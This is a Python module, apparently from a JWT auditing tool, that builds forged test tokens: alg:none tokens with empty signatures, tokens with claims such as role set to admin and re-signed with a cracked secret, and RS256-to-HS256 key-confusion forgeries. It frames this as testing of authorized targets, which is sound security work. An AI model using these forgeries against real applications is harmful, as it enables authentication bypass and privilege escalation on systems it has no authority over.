"""
tamper.py - "Tamper Forge": build modified JWTs for auditing how a
target application validates signatures and claims.

Every function here is a generator of a *test token*, not an attack
against a live system -- nothing in this module makes a network call.
It's the tester's responsibility to replay the generated token against
their own authorized target and observe whether it's wrongly accepted.
"""

import copy
import json
from typing import Optional

from . import jwt_utils


def alg_none_attack(token: str) -> str:
    """
    Classic bug class: some libraries honour `alg: none` and skip
    signature verification entirely (CVE-2015-9235 and relatives).
    Produces a token with the same header/payload but alg replaced by
    'none' and an empty signature.
    """
    decoded = jwt_utils.decode_token(token)
    header = copy.deepcopy(decoded["header"])
    payload = copy.deepcopy(decoded["payload"])
    return jwt_utils.build_token(header, payload, secret=None, alg="none")


def tamper_claims(
    token: str,
    claim_updates: dict,
    secret: Optional[str],
    alg: Optional[str] = None,
) -> str:
    """
    Modify one or more claims (e.g. {"role": "admin"}) and re-sign with
    a known/cracked secret. If `secret` is None, the token is emitted
    unsigned (empty signature) purely to show what the tampered payload
    decodes to -- it will only be accepted by a target that fails to
    verify signatures.
    """
    decoded = jwt_utils.decode_token(token)
    header = copy.deepcopy(decoded["header"])
    payload = copy.deepcopy(decoded["payload"])
    payload.update(claim_updates)

    if secret is None:
        return jwt_utils.build_token(header, payload, secret=None, alg="none")

    use_alg = (alg or header.get("alg") or "HS256").upper()
    return jwt_utils.build_token(header, payload, secret=secret.encode("utf-8"), alg=use_alg)


def alg_confusion_rs_to_hs(token: str, public_key_pem: str) -> str:
    """
    Known "RS256 -> HS256" key-confusion bug: if a verifier is
    misconfigured to accept either algorithm using the SAME key
    material, a tester who legitimately knows the RS256 public key
    (it's public -- e.g. from a JWKS endpoint the app itself exposes)
    can re-sign the token as HS256 using that public key text as the
    HMAC secret. This only succeeds against an already-misconfigured
    verifier; it is not a way to forge a real RS256 signature.
    """
    decoded = jwt_utils.decode_token(token)
    header = copy.deepcopy(decoded["header"])
    payload = copy.deepcopy(decoded["payload"])
    secret_bytes = public_key_pem.encode("utf-8")
    return jwt_utils.build_token(header, payload, secret=secret_bytes, alg="HS256")


def dump_token(token: str) -> str:
    """Pretty-print a token's header/payload for manual review."""
    decoded = jwt_utils.decode_token(token)
    return json.dumps(
        {"header": decoded["header"], "payload": decoded["payload"]},
        indent=2,
        sort_keys=True,
    )
